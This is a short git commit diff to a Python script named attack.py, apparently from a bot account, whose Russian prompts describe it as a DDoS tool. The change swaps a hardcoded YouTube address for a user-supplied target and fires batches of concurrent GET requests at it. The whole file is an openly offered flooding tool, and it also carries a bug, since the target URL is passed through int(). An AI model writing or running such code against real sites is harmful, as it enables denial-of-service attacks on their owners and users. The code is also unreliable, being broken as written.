56edf27a5bf76d0ce7f71552267490e6834638b2
VladVladVladbot <95708823+VladVladVladbot@users.noreply.github.com>
2022-06-15 21:42:50 +0300

    Updaate attack.py

--- attack.py
+++ attack.py
@@ -1,9 +1,10 @@
 import grequests
+k0 = int(input("Введите сайт на который будет вестись d-dos атака: "))
 k1 = int(input("Введите сколько пачек будет запросов: "))
 k2 = int(input("Введите сколько запросов в пачке: "))
 for l in range(int(k1)):
     n = k2 #Количество запросов
-    sites = ["https://www.youtube.com/" for x in range(n)]
+    sites = [k0 for x in range(n)]
     res = (grequests.get(url) for url in sites)
     r = grequests.map(res)
     #<Response [200]>
